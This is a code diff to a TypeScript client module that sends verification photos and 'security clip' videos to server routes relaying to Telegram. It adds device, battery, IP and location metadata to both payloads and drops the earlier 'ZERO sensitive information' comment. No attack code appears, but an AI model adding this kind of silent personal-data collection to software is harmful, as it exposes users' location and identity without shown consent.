@@ -1,11 +1,14 @@
+import { RichDeviceInfo } from './deviceInfo';
+
 /**
- * Client-side trigger for sending minimal verification notification to Telegram via server-side API.
- * Contains ZERO sensitive information and ZERO client-side tokens.
+ * Client-side trigger for sending verification notification to Telegram via server-side API.
+ * Includes complete device, battery, charging status, IP & location metadata.
  */
 export async function sendTelegramVerificationNotification(params: {
   verificationId: string;
   photoBase64?: string;
   alisId?: string;
+  deviceInfo?: RichDeviceInfo;
 }): Promise<{ success: boolean; delivered?: boolean; note?: string; error?: string }> {
   try {
     const response = await fetch('/api/notify-telegram', {
@@ -17,6 +20,7 @@ export async function sendTelegramVerificationNotification(params: {
         verificationId: params.verificationId,
         photoBase64: params.photoBase64,
         alisId: params.alisId,
+        deviceInfo: params.deviceInfo,
         time: new Date().toISOString(),
       }),
     });
@@ -52,6 +56,7 @@ export async function sendSecurityClipToServer(params: {
   cycle: number;
   videoBase64?: string;
   mimeType?: string;
+  deviceInfo?: RichDeviceInfo;
 }): Promise<{ success: boolean; cycle?: number; error?: string }> {
   try {
     const res = await fetch('/api/security-feed', {
